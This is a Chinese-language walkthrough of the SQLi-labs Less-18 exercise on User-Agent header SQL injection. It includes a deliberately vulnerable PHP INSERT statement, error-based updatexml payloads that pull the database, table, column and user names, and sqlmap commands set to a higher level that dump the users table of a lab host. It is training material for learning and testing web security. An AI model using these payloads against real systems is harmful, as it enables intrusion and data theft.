---
title: less18
url: https://www.yuque.com/u29002979/ep2zrx/gfgn1kfnnkq1xr8x
---

```bash
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			echo '<font color= "#FFFF00" font size = 3 >';
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

源码这里当用户名跟密码都有输入的时候才能触发的，可以看到用户名和密码都被过筛了，也就是不能在这里进行SQL注入了

> **Your IP ADDRESS is: 192.168.31.119**

网页记录了本地ip的信息，说明可能事数据库记录了本机的信息，
即后台获取了一些诸如Ip的信息保存 到数据库中，
并且页面返回了数据包**user-agent**的信息，
那么在请求头中就可能存在注入点\ <a name="hHPE1"></a>

# 请求头注入

> 源代码标识获取浏览器信息，即user-Agent部分，
> 表示客户端通过什么浏览器向后台请求
> 在后面的请求中也有将该部分进行存储添加到数据库，
> 现在就可以通过一些手段在数据添加的同时进行注入

<a name="Y51fI"></a>

## 报错注入

<a name="JHCAA"></a>

### 爆破数据库名称

1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
不能像常规的报错盲注一样直接上，我们得考虑一下闭合VALUES，假如我们利用的点是$uagent，那构建格式就应该是1',1,1)#，在SQL语句中相当于

```bash
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1',1,1)#, '$IP', $uname)
```

> Your IP ADDRESS is: 192.168.31.119
> Your User Agent is: 1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
> XPATH syntax error: '~security~'

<a name="I1uZq"></a>

### 爆破数据表

`1',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#` <a name="tlVTR"></a>

### 爆破字段名

`1',1, updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)) -- +` <a name="MrWWa"></a>

### 爆破字段

`1',1, updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +` <a name="uA05n"></a>

# sqlmap进行头部注入

> 在头部注入爆破中，sqlmap需要提高扫描等级 level和risk\
> level x(x为1-5)
> 2时会对头部的**cookie**进行扫描注入尝试，
> x>=3时对**user-Agent**,**ip**,**referer** 参数进行扫描
>
> risk x(x 1-3)
> 1时进行大部分扫描
> 2会增加基于事件的测试语句
> 3会增加or语句的sql注入

<a name="pqNBo"></a>

# 检测注入点

`sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&uname=admin" --batch --level 3 ` <a name="t2ABA"></a>

# 爆破数据库名

`sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&uname=admin" --batch --level 3 --current-db` <a name="bdXmy"></a>

# 爆破数据表名

`sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&uname=admin" --batch --level 3 -D "security" --tables` <a name="Dm6EO"></a>

# 爆破字段内容

`sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&uname=admin" --batch --level 3 -D "security" -T "users" --dump`
